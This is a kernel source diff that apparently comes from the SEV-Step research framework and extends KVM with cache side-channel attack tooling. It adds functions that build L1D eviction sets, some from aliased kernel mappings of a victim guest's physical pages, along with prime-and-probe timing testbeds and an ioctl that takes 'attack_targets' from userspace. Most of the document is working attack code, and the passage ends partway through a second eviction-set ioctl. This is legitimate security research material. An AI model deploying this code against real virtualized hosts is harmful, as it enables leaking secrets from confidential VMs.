@@ -73,6 +73,7 @@
 //
 #include <linux/sev-step/sev-step.h>
 #include <linux/sev-step/userspace_page_track_api.h>
+#include <linux/sev-step/libcache.h>
 
 // Own spinlock implementation
 #include <linux/raw_spinlock.h>
@@ -4673,6 +4674,628 @@ put_kvm:
 	return r;
 }
 
+/**
+ * @brief vunmap addrs in @kern and unpin pages in @pinned_pages.
+ * Finally, call freeAddrListEntries on @kern
+ * 
+ * @param kern linked list of eviction set addrs to vunmap
+ * @param pinned_pages array with pointers to the struct pages belonging
+ * to the addrs in kern
+ * @param pinned_pages_len
+ */
+void free_kernel_mappings_for_user_eviction_set(addr_list_t* kern,
+	struct page** pinned_pages, uint64_t pinned_pages_len) {
+	addr_list_entry_t* e;
+	void* page_aligned_addr;
+	for (e = kern->first; e != NULL; e = e->next) {
+		page_aligned_addr = (void*)(e->addr & ~0xfff);
+		vunmap(page_aligned_addr);
+	}
+	printk("%s:%d all vunmap calls succeeded",__FILE__,__LINE__);
+	freeAddrListEntries(kern);
+	printk("%s:%d freeAddrListEntries succeeded",__FILE__,__LINE__);
+	unpin_user_pages(pinned_pages, pinned_pages_len);
+	printk("%s:%d unpin_user_pages succeeded",__FILE__,__LINE__);
+}
+
+/**
+ * @brief Create a mapping (hva) to the host physcal address this gpa points to
+ * 
+ * @param gpa 
+ * @param hva_alias caller allocated result param
+ * @param pinned_page caller allocated result param. filled with the page that was pinned
+ * for this mapping. Must be unpinned with unpin_user_pages
+ * 
+ * @return int 0 on success
+ */
+static int get_aliased_mapping_for_gpa(uint64_t gpa, uint64_t* hva_alias,
+	struct page** pinned_page) {
+	uint64_t gfn;
+	uint64_t tmp_hva;
+	int locked;
+	struct page *page;
+	void* kernel_mapping;
+
+
+	gfn = gpa >> 12;
+	tmp_hva = kvm_vcpu_gfn_to_hva(global_sev_step_config.main_vm->vcpus[0],gfn);
+	mmap_read_lock(global_sev_step_config.main_vm->mm);
+	locked = 1;
+	if (get_user_pages_remote(global_sev_step_config.main_vm->mm,
+		tmp_hva, 1, 0, &page,NULL,&locked) != 1) {
+		printk("get_user_pages_remote_unlocked failed\n");
+		return 1;
+	} else {
+		printk("get_user_pages_remote_unlocked was successfull");
+	}
+	mmap_read_unlock(global_sev_step_config.main_vm->mm);
+
+
+	if( page == NULL ) {
+		printk("%s:%d page returned by get_user_pages_remote was NULL",__FILE__,__LINE__);
+		return 1;
+	}
+
+	kernel_mapping = vmap(&page,1,0,__pg(__PAGE_KERNEL | _PAGE_ENC));
+	if( kernel_mapping == NULL ) {
+		printk("%s:%d : get_aliased_mapping_for_gpa :"
+			"vmap failed",__FILE__,__LINE__);
+		unpin_user_pages(&page,1);
+		return 1;
+	}
+	//re-add page offse from the gpa
+	kernel_mapping += (gpa & 0xfff);
+
+	(*hva_alias) = (uint64_t)kernel_mapping;
+	(*pinned_page) = page;
+	return 0;
+
+}
+
+/**
+ * @brief Get the kernel mappings for user evictin set object
+ * 
+ * @param user 
+ * @param kern result param. Expected to be initialized
+ * @param pinned_pages result param. Caller allocated array with
+ * enough memory to hold @user->eviction_sets_len entries. Will be filled with the pages
+ * pinned by this code.
+ * We need them later on to unpin them after deleting our mapping. 
+ * @return int 0 on success
+ */
+static int get_kernel_mappings_for_user_evictin_set(lookup_table_eviction_set_t* user,
+	addr_list_t* kern, struct page** pinned_pages) {
+
+	uint64_t idx;
+	for( idx = 0; idx < user->eviction_sets_len; idx++ ) {
+		int err;
+		struct page* page;
+		uint64_t user_addr_page_offset;
+		void* kernel_mapping;
+
+		user_addr_page_offset = user->eviction_sets[idx] & 0xfff;
+		//get mapping / pin page
+		err = get_user_pages_unlocked(
+			user->eviction_sets[idx] & ~0xfff,
+			1,
+			&page,
+			FOLL_WRITE
+		);
+		if( err <= 0 ) {
+			printk("%s:%d : get_kernel_mappings_for_user_evictin_set :"
+				"get_user_pages_unlocked failed for idx %llu",__FILE__,__LINE__,idx);
+			//if we fail, here, we successfully pinned idx+1 pages -> unpin them before returning
+			unpin_user_pages(pinned_pages, idx+1);
+			return 1;
+		}
+		pinned_pages[idx] = page;
+
+		kernel_mapping = vmap(&page,1,0,__pg(__PAGE_KERNEL | _PAGE_ENC));
+		if( kernel_mapping == NULL ) {
+			printk("%s:%d : get_kernel_mappings_for_user_evictin_set :"
+				"vmap failed for idx %llu",__FILE__,__LINE__,idx);
+			free_kernel_mappings_for_user_eviction_set(kern,pinned_pages,idx+1);
+			return 1;
+		}
+
+		insert_end(kern,(uint64_t)kernel_mapping + user_addr_page_offset);
+		printk("pfn 0x%lx, user vaddr 0x%llx, kern vaddr 0x%llx\n",
+			page_to_pfn(page),
+			user->eviction_sets[idx],
+			(uint64_t)(kernel_mapping + user_addr_page_offset)
+		);
+	}
+	return 0;
+}
+
+typedef struct {
+	bool is_done;
+	spinlock_t lock;
+} cache_attack_testbed_thread_args_t;
+
+/**
+ * @brief Test the l1d aliasing attack withotu vm
+ * 
+ * @param void_ctx 
+ * @return int 
+ */
+int cache_attack_testbed_aliasing_attack_fn(void* void_ctx) {
+	addr_list_t* ev1;
+	addr_list_t* ev2;
+	uint64_t ev_len;
+	uint64_t* probe_array1;
+	uint64_t* probe_array2;
+	uint64_t* result_array;
+	uint64_t probe_array_idx;
+	uint64_t result_array_idx;
+	uint64_t victim_access_idx;
+
+	addr_list_entry_t* e;
+	cache_attack_testbed_thread_args_t* args;
+
+	args = (cache_attack_testbed_thread_args_t*)void_ctx;
+
+	printk("%s: setting up data structures\n",__FUNCTION__);
+
+	ev1 = &global_sev_step_config.cache_attack_config->eviction_sets[0];
+	ev2 = &global_sev_step_config.cache_attack_config->eviction_sets[1];
+	printk("ev1 = 0x%llx, ev2 = 0x%llx\n",(uint64_t)ev1,(uint64_t)ev2);
+	ev_len = 0;
+	for( e = ev1->first; e != NULL; e = e->next) {
+		ev_len +=1;
+	}
+	probe_array1 = kmalloc(sizeof(uint64_t) * ev_len, GFP_KERNEL);
+	probe_array2 = kmalloc(sizeof(uint64_t) * ev_len, GFP_KERNEL);
+	result_array = kmalloc(sizeof(uint64_t) * ev_len * 2, GFP_KERNEL);
+
+	setup_perfs(&global_sev_step_config);
+
+	probe_array_idx = 0;
+	for (e = ev1->first; e != NULL; e = e->next) {
+		printk("%s:%d e = 0x%llx e->addr 0x%llx, probe_array1+idx = 0x%llx\n",
+			__FILE__,__LINE__,(uint64_t)e,(uint64_t)e->addr,(uint64_t)(probe_array1+probe_array_idx)
+		);
+		probe_array1[probe_array_idx] = e->addr;
+		probe_array_idx += 1;
+	}
+	probe_array_idx = 0;
+	for (e = ev2->first; e != NULL; e = e->next) {
+		printk("%s:%d e = 0x%llx e->addr 0x%llx, probe_array2+idx = 0x%llx\n",
+			__FILE__,__LINE__,(uint64_t)e,(uint64_t)e->addr,(uint64_t)(probe_array2+probe_array_idx)
+		);
+		probe_array2[probe_array_idx] = e->addr;
+		probe_array_idx += 1;
+	}
+
+
+	printk("%s: doing prime and probe",__FUNCTION__);
+	for( victim_access_idx = 0; victim_access_idx < ev_len; victim_access_idx++) {
+		__asm__("mfence");
+		cpu_warm_up(10000000);
+
+		//prime
+		for( result_array_idx = 0; result_array_idx < (2*ev_len);result_array_idx++) {
+			cpu_maccess( (uint64_t)(result_array + result_array_idx));
+		}
+		cpu_prime_array(probe_array1,ev_len);
+
+		__asm__("mfence");
+		//victim access
+		cpu_maccess( probe_array2[victim_access_idx]);
+
+		__asm__("mfence");
+		//probe
+		cpu_probe_array_individual(probe_array1,ev_len,result_array);
+		__asm__("mfence");
+		cpu_warm_up(100000000);
+
+		result_array_idx = 0;
+		probe_array_idx = 0;
+		for (e = ev1->first; e != NULL; e = e->next) {
+			uint64_t offset = ((uint64_t)(e->addr))&0xfffULL;
+			uint64_t timing = result_array[2*result_array_idx];
+			uint64_t perf_diff = result_array[(2*result_array_idx)+1];
+			//cpu_probe_pointer_chasing_inplace writes measurment data to the addr stored in e->addr
+			printk("%s:%d : elem %llu\t, offset 0x%03llx, time %llu, perf diff %llu\n",__FILE__,__LINE__,
+				probe_array_idx, offset, timing, perf_diff);
+			probe_array_idx += 1;
+			result_array_idx += 1;
+		}
+		printk("\n\n\n");
+	}
+	
+
+	kfree(probe_array1);
+	kfree(probe_array2);
+	kfree(result_array);
+	spin_lock(&args->lock);
+	args->is_done = true;
+	spin_unlock(&args->lock);
+	return 0;
+}
+
+
+int cache_attack_testbed_multiple_sets_indiviual_timing_fn(void* void_ctx) {
+	uint64_t table1_idx, table2_idx;
+	void* table1_chase;
+	//void* table1_chase_rev;
+	void* table2_chase;
+	//void* table2_chase_rev;
+	uint64_t* table1_ev_array;
+	uint64_t* table2_ev_array;
+	uint64_t table1_len;
+	uint64_t table2_len;
+	addr_list_entry_t *e;
+	uint64_t idx;
+	uint64_t i,j;
+	uint64_t max_access_time;
+	uint64_t offset_with_max_time;
+	uint64_t entries_with_max_access_time;
+	uint64_t block_access_time_sum;
+	uint64_t cache_sets;
+	//uint64_t vmcb_offset;
+	cache_attack_testbed_thread_args_t* args;
+
+	uint64_t* table1_aliased_probe_array;
+	uint64_t table1_pages_len;
+	struct page** table1_pages;
+
+	//uint64_t idx_stray_access;
+	const uint64_t way_count = global_sev_step_config.cache_attack_config->way_count;
+	uint64_t victim_cache_set = 1;
+	args = (cache_attack_testbed_thread_args_t*)void_ctx;
+
+	table1_idx = 0;
+	table2_idx = 1;
+	cache_sets = global_sev_step_config.cache_attack_config->lookup_tables[table1_idx].table_bytes/64;
+
+	//count length, allocate and fill ev arrays
+	table1_len = global_sev_step_config.cache_attack_config->eviction_sets[table1_idx].length;
+	table2_len = global_sev_step_config.cache_attack_config->eviction_sets[table2_idx].length;
+	table1_ev_array = kmalloc( sizeof(uint64_t) * table1_len ,GFP_KERNEL);
+	table2_ev_array = kmalloc( sizeof(uint64_t) * table2_len, GFP_KERNEL);
+	table1_aliased_probe_array =  kmalloc( sizeof(uint64_t) * table1_len ,GFP_KERNEL);
+
+	idx = 0;
+	for (e = global_sev_step_config.cache_attack_config->eviction_sets[table1_idx].first;
+		e != NULL; e = e->next) {
+		table1_ev_array[idx] = e->addr;
+		printk("table1 ev entry %llu : 0x%llx\n",idx,e->addr);
+		idx += 1;
+	}
+	idx = 0;
+	for (e = global_sev_step_config.cache_attack_config->eviction_sets[table2_idx].first;
+		e != NULL; e = e->next) {
+		table2_ev_array[idx] = e->addr;
+		idx += 1;
+	}
+
+	printk("table1_len %llu, table2_len %llu\n",table1_len,table2_len);
+	printk("table1_len + (2*way_count) = %llu\n",table1_len + (2*way_count));
+	
+
+	table1_pages_len = global_sev_step_config.cache_attack_config->pinned_pages_inner_len[table1_idx];
+	table1_pages =  global_sev_step_config.cache_attack_config->pinned_pages[table1_idx];
+
+	e = global_sev_step_config.cache_attack_config->eviction_sets[table1_idx].first;
+	for( idx = 0; idx < table1_pages_len; idx++) {
+		//get page aligned mapping
+		uint64_t v = (uint64_t)vmap(&table1_pages[idx],1,0,__pg(__PAGE_KERNEL | _PAGE_ENC));
+		if (v == 0 ) {
+			printk("vmap failed\n");
+			spin_lock(&args->lock);
+			args->is_done = true;
+			spin_unlock(&args->lock);
+			return 1;
+		}
+		//fix offset and store
+		v = (v & ~0xfff) | (e->addr & 0xfff);
+		table1_aliased_probe_array[idx] = v;
+		printk("pfn 0x%lx, orig vaddr 0x%llx aliased vaddr 0x%llx\n",
+			page_to_pfn(table1_pages[idx]),e->addr,v
+		);
+
+
+		e = e->next;
+	}
+
+	setup_perfs(&global_sev_step_config);
+
+	//fill chase structures
+
+	for( victim_cache_set = 0; victim_cache_set < cache_sets; victim_cache_set++ ) {
+		printk("victim cache set: %llu\n",victim_cache_set);
+		
+		cpu_fillEvSetRandomized(&table1_chase,
+			&global_sev_step_config.cache_attack_config->eviction_sets[table1_idx]);
+		cpu_fillEvSetRandomized(&table2_chase,
+			&global_sev_step_config.cache_attack_config->eviction_sets[table2_idx]);
+
+		/*{
+			uint64_t* p = ((uint64_t*)table1_chase);
+			while( p != NULL ) {
+				printk("forward: p = 0x%llx, *p = 0x%llx\n",(uint64_t)p,(uint64_t)*p);
+				p = (uint64_t*)(*p);
+			}
+		}*/
+
+
+	
+	
+
+
+		//prime
+		cpu_warm_up(1000000);
+		//TODO: try priming in different directions
+		//TODO: can we measure accesses with zero stepping
+		cpu_prime_pointer_chasing(table1_chase);
+		cpu_prime_array(table1_ev_array,table1_len);
+		cpu_prime_pointer_chasing(table1_chase);
+		cpu_prime_array(table1_ev_array,table1_len);
+		cpu_prime_pointer_chasing(table1_chase);
+
+		//cpu_prime_array(table1_aliased_probe_array,table1_len);
+
+
+		__asm__("mfence");
+
+		/*
+		//memory access that probably happens during context switch from context switch
+		for( vmcb_offset = 0; vmcb_offset < sizeof(struct vmcb_control_area) - 64 ; vmcb_offset+=64) {
+			cpu_maccess( ((uint64_t)global_sev_step_config.vmcb_control_kern_vaddr) + vmcb_offset);
+		}*/
+
+		cpu_maccess(table2_ev_array[ victim_cache_set * way_count]);
+		//cpu_prime_pointer_chasing(table2_chase);
+		//table2 is larger, access some element not covered by table1 to simulate access to
+		//differetn cache set
+		//cpu_maccess(table2_ev_array[ (table1_len+3) * way_count]);
+		//cpu_maccess(table2_ev_array[ table1_len + (2*way_count)]);
+		__asm__("mfence");
+		
+	
+		//probe
+		cpu_probe_pointer_chasing_inplace(table1_chase);
+
+
+
+		//prints results
+		
+		i = 0;
+		j = 0;
+		max_access_time = 0;
+		entries_with_max_access_time = 0;
+		block_access_time_sum = 0;
+		for (e = global_sev_step_config.cache_attack_config->eviction_sets[table1_idx].first;
+			e != NULL; e = e->next) {
+
+			uint64_t offset = ((uint64_t)(e->addr))&0xfffULL;
+			uint64_t timing = ((uint64_t*)(e->addr))[0];
+			uint64_t perf_diff = ((uint64_t*)(e->addr))[1];
+			//cpu_probe_pointer_chasing_inplace writes measurment data
+			//to the addr stored in e->addr
+			printk("res: elem %04llu\t, offset 0x%03llx, time %03llu, perf diff %llu, high?: %d want? %d\n",
+				i/64, offset, timing, perf_diff, timing > 50,
+				(j == (victim_cache_set * way_count))
+			);
+			block_access_time_sum += timing;
+			i += 64;
+			j += 1;
+			if( (j % way_count) == 0 ) {
+				printk("avg time %llu\n",block_access_time_sum);
+				block_access_time_sum = 0;
+			}
+			if( timing > max_access_time ) {
+				max_access_time = timing;
+				entries_with_max_access_time = 1;
+				offset_with_max_time = offset;
+			} else if( timing == max_access_time ) {
+				entries_with_max_access_time += 1;
+			}
+		}
+		printk("\n\n");
+		printk("max time: %03llu was reached %lld times\n",max_access_time,entries_with_max_access_time);
+		if( entries_with_max_access_time == 1 ) {
+			printk("unique elem with max access time at offset 0x%03llx\n",offset_with_max_time);
+		}
+		printk("\n###################\n");
+	}
+
+
+	kfree(table1_ev_array);
+	kfree(table2_ev_array);
+
+	
+
+	spin_lock(&args->lock);
+	args->is_done = true;
+	spin_unlock(&args->lock);
+	return 0;
+}
+
+ int cache_attack_testbed_thread_fn(void* void_ctx) {
+	uint64_t table1_idx, table2_idx;
+	void* table1_chase;
+	void* table2_chase;
+	uint64_t* table1_ev_array;
+	uint64_t* table2_ev_array;
+	uint64_t table1_len;
+	uint64_t table2_len;
+	addr_list_entry_t *e;
+	int i;
+	uint64_t idx;
+	//uint64_t j;
+	//uint64_t max_access_time;
+	//uint64_t offset_with_max_time;
+	//uint64_t entries_with_max_access_time;
+	//uint64_t block_access_time_sum;
+	addr_list_t list_tmp;
+	uint64_t cache_set_idx;
+	void** cache_set_chases_forward;
+	uint64_t cache_set_chases_len;
+	uint64_t** cache_set_timings;
+	cache_attack_testbed_thread_args_t* args;
+
+	const uint64_t way_count = 8;
+	uint64_t victim_cache_set = 0;
+
+	args = (cache_attack_testbed_thread_args_t*)void_ctx;
+
+	table1_idx = 0;
+	table2_idx = 1;
+
+	setup_perfs(&global_sev_step_config);
+
+	//fill chase structures
+
+	cpu_fillEvSet(&table1_chase,
+		&global_sev_step_config.cache_attack_config->eviction_sets[table1_idx]
+	);
+	cpu_fillEvSet(&table2_chase,
+		&global_sev_step_config.cache_attack_config->eviction_sets[table2_idx]
+	);
+
+	//count length, allocate and fill ev arrays
+	table1_len = 0;
+	for (e = global_sev_step_config.cache_attack_config->eviction_sets[table1_idx].first;
+		e != NULL; e = e->next) {
+			table1_len += 1;
+	}
+	table2_len = 0;
+	for (e = global_sev_step_config.cache_attack_config->eviction_sets[table2_idx].first;
+		e != NULL; e = e->next) {
+			table2_len += 1;
+	}
+
+	if( table1_len != table2_len ) {
+		printk("ASSERTION error table1_len != table2_len\n");
+	}
+	table1_ev_array = kmalloc( sizeof(uint64_t) * table1_len ,GFP_KERNEL);
+	table2_ev_array = kmalloc( sizeof(uint64_t) * table2_len, GFP_KERNEL);
+
+	idx = 0;
+	cache_set_chases_len = table1_len / way_count;
+	cache_set_chases_forward = kmalloc(sizeof(void*) * cache_set_chases_len,GFP_KERNEL);
+	initAddrList(&list_tmp);
+	cache_set_idx = 0;
+	for (e = global_sev_step_config.cache_attack_config->eviction_sets[table1_idx].first;
+		e != NULL; e = e->next) {
+			insert_end(&list_tmp,e->addr);
+			table1_ev_array[idx] = e->addr;
+			idx += 1;
+
+			if( (idx % way_count) == 0) {
+
+				cpu_fillEvSet(&cache_set_chases_forward[cache_set_idx],&list_tmp);
+
+				freeAddrListEntries(&list_tmp);
+				initAddrList(&list_tmp);
+				cache_set_idx += 1;
+			}
+	}
+
+
+	idx = 0;
+	for (e = global_sev_step_config.cache_attack_config->eviction_sets[table2_idx].first;
+		e != NULL; e = e->next) {
+			table2_ev_array[idx] = e->addr;
+			idx += 1;
+	}
+
+	cache_set_timings = kmalloc(sizeof(uint64_t*) * cache_set_chases_len,GFP_KERNEL);
+	for( victim_cache_set = 0; victim_cache_set < cache_set_chases_len ;victim_cache_set++) {
+		cache_set_timings[victim_cache_set] = kmalloc(sizeof(uint64_t) * cache_set_chases_len,GFP_KERNEL);
+		memset(cache_set_timings[victim_cache_set],0,sizeof(uint64_t) * cache_set_chases_len);
+	}
+
+	printk("way count %llu, total ev entries %llu, sets covered by ev %llu\n",way_count,table2_len,cache_set_chases_len);
+
+
+	for( victim_cache_set = 0; victim_cache_set < cache_set_chases_len ;victim_cache_set++) {
+
+		//prime
+		cpu_warm_up(1000000);
+		//TODO: try priming in different directions
+		//TODO: can we measure accesses with zero stepping
+		cpu_prime_pointer_chasing(table1_chase);
+		
+
+
+		__asm__("lfence");
+		//victim access
+		cpu_maccess(table2_ev_array[ victim_cache_set * way_count]);
+		
+
+		//probe
+		//cpu_probe_pointer_chasing(table1_chase);
+		__asm__("lfence");
+
+		for( i = cache_set_chases_len - 1; i >= 0; i-- ) {
+			//TODO: try pointer chasing backwards
+			cache_set_timings[victim_cache_set][i] = cpu_probe_pointer_chasing(cache_set_chases_forward[i]);
+			__asm__("lfence");
+		}
+		//cache_set_timings[victim_cache_set][1] = cpu_probe_pointer_chasing(cache_set_chases[1]);
+
+	}
+	
+	__asm__("mfence");
+	cpu_warm_up(1000000);
+
+	for( victim_cache_set = 0; victim_cache_set < cache_set_chases_len ;victim_cache_set++) {
+		printk("victim cache set %llu\n",victim_cache_set);
+		for( i = 0; i < cache_set_chases_len; i++ ) {
+			printk("cache set %02d timing %03llu\n",i,cache_set_timings[victim_cache_set][i]);
+		}
+	}
+
+	//prints results
+	
+	/*i = 0;
+	j = 0;
+	max_access_time = 0;
+	entries_with_max_access_time = 0;
+	block_access_time_sum = 0;
+	for (e = global_sev_step_config.cache_attack_config->eviction_sets[table1_idx].first;
+		e != NULL; e = e->next) {
+
+		uint64_t offset = ((uint64_t)(e->addr))&0xfffULL;
+		uint64_t timing = ((uint64_t*)(e->addr))[0];
+		uint64_t perf_diff = ((uint64_t*)(e->addr))[1];
+		//cpu_probe_pointer_chasing_inplace writes measurment data
+		//to the addr stored in e->addr
+		printk("res: elem %04llu\t, offset 0x%03llx, time %03llu, perf diff %llu, high?: %d want? %d\n",
+			i/64, offset, timing, perf_diff, timing > 50, offset == (victim_access_offset & ~0xf)
+		);
+		block_access_time_sum += timing;
+		i += 64;
+		j += 1;
+		if( (j % way_count) == 0 ) {
+			printk("avg time %llu\n",block_access_time_sum);
+			block_access_time_sum = 0;
+		}
+		if( timing > max_access_time ) {
+			max_access_time = timing;
+			entries_with_max_access_time = 1;
+			offset_with_max_time = offset;
+		} else if( timing == max_access_time ) {
+			entries_with_max_access_time += 1;
+		}
+	}
+	printk("\n\n\n");
+	printk("max time: %03llu was reached %lld times\n",max_access_time,entries_with_max_access_time);
+	if( entries_with_max_access_time == 1 ) {
+		printk("unique elem with max access time at offset 0x%03llx\n",offset_with_max_time);
+	}*/
+	kfree(table1_ev_array);
+	kfree(table2_ev_array);
+
+	spin_lock(&args->lock);
+	args->is_done = true;
+	spin_unlock(&args->lock);
+	return 0;
+}
+
 static long kvm_dev_ioctl(struct file *filp,
 			  unsigned int ioctl, unsigned long arg)
 {
@@ -4984,6 +5607,7 @@ static long kvm_dev_ioctl(struct file *filp,
 	break;
 	case KVM_SEV_STEP_GET_VMCB_SAVE_AREA: {
 		struct vmcb_save_area real_vmcb;
+		struct sev_es_save_area* vmsa;
 		sev_step_partial_vmcb_save_area_t partial_vmcb;
 		printk("KVM_SEV_STEP_GET_VMCB_SAVE_AREA: got called\n");
 
@@ -4995,8 +5619,10 @@ static long kvm_dev_ioctl(struct file *filp,
 			return -EINVAL;
 		}
 
-		if( 0 != sev_step_get_vmcb_save_area(global_sev_step_config.main_vm->vcpus[0], &real_vmcb) ) {
+		vmsa = kmalloc(sizeof(partial_vmcb), GFP_KERNEL);
+		if( 0 != sev_step_get_vmcb_save_area(global_sev_step_config.main_vm->vcpus[0], &real_vmcb,vmsa) ) {
 			printk("KVM_SEV_STEP_GET_VMCB_SAVE_AREA: sev_step_get_vmcb_save_area failed\n");
+			kfree(vmsa);
 			mutex_unlock(&sev_step_config_mutex);
 			return -EINVAL;
 		}
@@ -5007,12 +5633,650 @@ static long kvm_dev_ioctl(struct file *filp,
 		partial_vmcb.rsp = real_vmcb.rsp;
 		partial_vmcb.cr3 = real_vmcb.cr3;
 
+		kfree(vmsa);
 		if (copy_to_user(argp, &partial_vmcb, sizeof(sev_step_partial_vmcb_save_area_t))) {
 			printk("KVM_SEV_STEP_GET_VMCB_SAVE_AREA: failed to copy results to userspace\n");
 			return -EFAULT;
 		}
 	
 
+	}
+	r = 0;
+	break;
+	case KVM_SEV_STEP_BUILD_ALIAS_EVS: {
+		//
+		//ATTENTION: here we assume attack_targets to contain GPAs for the victim
+		//
+		build_eviction_set_param_t param;
+		lookup_table_t* attack_targets;
+		size_t attack_targets_bytes;
+		addr_list_t* eviction_sets;
+		bool error_bulding_ev;
+		int attack_target_idx;
+	
+		struct page*** pinned_pages;
+		uint64_t* pinned_pages_inner_len;
+
+		printk("KVM_SEV_STEP_BUILD_ALIAS_EVS: got called\n");
+
+		//
+		//Copy all args from user space
+		//
+
+		if( copy_from_user(&param, argp, sizeof(param))) {
+			printk("KVM_SEV_STEP_BUILD_ALIAS_EVS: failed to copy build_eviction_set_param_t args\n");
+			return -EINVAL;
+		}
+		printk("%s:%d param.attack_targets = 0x%llx, param.attack_targets_len = %llu\n",
+			__FILE__,__LINE__, (uint64_t)param.attack_targets, param.attack_targets_len
+		);
+		attack_targets_bytes = sizeof(lookup_table_t) * param.attack_targets_len;
+		//on success, this is stored in sev_step_config.cache_attack_config and only freed later on
+		attack_targets = kmalloc(attack_targets_bytes, GFP_KERNEL);
+		if( copy_from_user(attack_targets, param.attack_targets, attack_targets_bytes) ) {
+			printk("KVM_SEV_STEP_BUILD_ALIAS_EVS: failed to copy attack_targets args\n");
+			kfree(attack_targets);
+			return -EINVAL;
+		}
+
+
+		//
+		// Build Eviction Set based on aliased mappings
+		//
+
+		//on success, this is stored in sev_step_config.cache_attack_config and only freed later on
+		eviction_sets = kmalloc(sizeof(addr_list_t) * param.attack_targets_len,GFP_KERNEL);
+		pinned_pages = kmalloc( sizeof(struct page**) * param.attack_targets_len, GFP_KERNEL);
+		pinned_pages_inner_len = kmalloc( sizeof(uint64_t) * param.attack_targets_len, GFP_KERNEL);
+
+		error_bulding_ev = false;
+		//create evictions with aliased mapping to each paddr used by the victim
+		for( attack_target_idx = 0; attack_target_idx < param.attack_targets_len && !error_bulding_ev;
+			attack_target_idx++) {
+			//shorthand pointing to currently processed lookup table
+			lookup_table_t* cur_lut;
+			//shorthand pointing to currently processed eviction table
+			addr_list_t* cur_ev;
+			uint64_t aliasing_hva;
+			int j;
+			cur_lut = &attack_targets[attack_target_idx];
+			cur_ev = &eviction_sets[attack_target_idx];
+
+			initAddrList(cur_ev);
+
+			//TODO: N.B. in this context cur_lut->base_vaddr_table is actually a gpa
+			if( ((cur_lut->base_vaddr_table + cur_lut->table_bytes) & ~0xfff) !=
+				(cur_lut->base_vaddr_table & ~0xfff )) {
+					printk("KVM_SEV_STEP_BUILD_ALIAS_EVS: ASSERTION ERROR: For now luts are restricted to a single page");
+					error_bulding_ev = true;
+					break;
+			}
+			pinned_pages_inner_len[attack_target_idx] = 1;
+			pinned_pages[attack_target_idx] = kmalloc(sizeof(struct page*) * pinned_pages_inner_len[attack_target_idx], GFP_KERNEL );
+
+			printk("%s:%d calling get_aliased_mapping_for_gpa\n",__FILE__,__LINE__);
+			if( get_aliased_mapping_for_gpa(cur_lut->base_vaddr_table,
+				&aliasing_hva,pinned_pages[attack_target_idx]) ) {
+				printk("KVM_SEV_STEP_BUILD_ALIAS_EVS: get_aliased_mapping_for_gpa failed");
+				error_bulding_ev = true;
+				break;
+			}
+			printk("%s:%d aliasing_hva is 0x%llx\n",__FILE__,__LINE__, aliasing_hva);
+			//iterate over of the number of cachelines per lookup table and add aliasing_hva
+			//with that offset to the ev
+			for( j = 0; j < cur_lut->table_bytes/64 && !error_bulding_ev ; j++ ) {
+				uint64_t ev_entry = aliasing_hva + (j*64);
+				printk("adding 0x%llx to ev\n",ev_entry);
+				insert_end(cur_ev, ev_entry);
+				printk("testing access\n");
+				*((volatile uint8_t*)ev_entry);
+			}
+		}
+		printk("%s:%d main loop done\n",__FILE__,__LINE__);
+
+		//on error free everything allocated so far
+		if( error_bulding_ev ) {
+			printk("KVM_SEV_STEP_BUILD_ALIAS_EVS: error_bulding_ev:"
+				"cleaning up everything allocated so far\n"
+			);
+			kfree(attack_targets);
+			free_eviction_sets(eviction_sets,param.attack_targets_len);
+			//TODO: unpin pages
+			return -EINVAL;
+		} else {
+			printk("success bulding alias ev!\n");
+			for( attack_target_idx = 0; attack_target_idx < param.attack_targets_len;
+				attack_target_idx++) {
+					printk("ev %u addr list first addr in list 0x%llx",
+						attack_target_idx,
+						(uint64_t)(eviction_sets[attack_target_idx].first->addr)
+					);
+			}
+		}
+
+		//
+		//Store Eviction Set in sev step context
+		//
+		mutex_lock(&sev_step_config_mutex);
+
+		if( global_sev_step_config.cache_attack_config != NULL ) {
+			printk("KVM_SEV_STEP_BUILD_ALIAS_EVS: overwriting existing cache attack config."
+			"This should not happen\n"
+			);
+			free_sev_step_cache_attack_config_t(global_sev_step_config.cache_attack_config);
+		}
+		global_sev_step_config.cache_attack_config = kmalloc(sizeof(sev_step_cache_attack_config_t),GFP_KERNEL);
+		global_sev_step_config.cache_attack_config->lookup_tables = attack_targets;
+		global_sev_step_config.cache_attack_config->lookup_tables_len = param.attack_targets_len;
+		global_sev_step_config.cache_attack_config->eviction_sets = eviction_sets;
+		global_sev_step_config.cache_attack_config->type = SEV_STEP_EV_TYPE_L1D_KERN_ONLY_ALIASING;
+		//TODO: calc real length
+		global_sev_step_config.cache_attack_config->chase_result_for_aliasing_attack = kmalloc(sizeof(uint64_t) * 100 , GFP_KERNEL);
+		global_sev_step_config.cache_attack_config->probe_array = kmalloc(sizeof(uint64_t) * 200 , GFP_KERNEL);
+		global_sev_step_config.cache_attack_config->way_count = 1; //a bit hacky, as we still have 8 ways but with aliasing attack, we only need one access to prime
+		global_sev_step_config.cache_attack_config->pinned_pages = pinned_pages;
+		global_sev_step_config.cache_attack_config->pinned_pages_inner_len = pinned_pages_inner_len;
+		global_sev_step_config.cache_attack_config->status = SEV_STEP_CACHE_ATTACK_IDLE;
+		global_sev_step_config.cache_attack_config->cache_attack_perf = param.cache_attack_perf;
+
+
+		mutex_unlock(&sev_step_config_mutex);
+	}
+	r = 0;
+	break;
+	case KVM_SEV_STEP_BUILD_EVS: {
+		build_eviction_set_param_t param;
+		lookup_table_t* attack_targets;
+		size_t attack_targets_bytes;
+		addr_list_t* eviction_sets;
+		bool error_bulding_ev;
+		int attack_target_idx;
+		printk("KVM_SEV_STEP_BUILD_EVS: got called\n");
+
+		//
+		//Copy all args from user space
+		//
+
+		if( copy_from_user(&param, argp, sizeof(param))) {
+			printk("KVM_SEV_STEP_BUILD_EVS: failed to copy build_eviction_set_param_t args\n");
+			return -EINVAL;
+		}
+
+		attack_targets_bytes = sizeof(lookup_table_t) * param.attack_targets_len;
+		//on success, this is stored in sev_step_config.cache_attack_config and only freed later on
+		attack_targets = kmalloc(attack_targets_bytes, GFP_KERNEL);
+		if( copy_from_user(attack_targets, param.attack_targets, attack_targets_bytes) ) {
+			printk("KVM_SEV_STEP_BUILD_EVS: failed to copy attack_targets args\n");
+			kfree(attack_targets);
+			return -EINVAL;
+		}
+
+		//
+		//Build Eviction Set
+		//
+
+		//on success, this is stored in sev_step_config.cache_attack_config and only freed later on
+		eviction_sets = kmalloc(sizeof(addr_list_t) * param.attack_targets_len,GFP_KERNEL);
+
+		error_bulding_ev = false;
+		//create evictions sets for each guest_vaddrs entry
+		for( attack_target_idx = 0; attack_target_idx < param.attack_targets_len && !error_bulding_ev;
+			attack_target_idx++) {
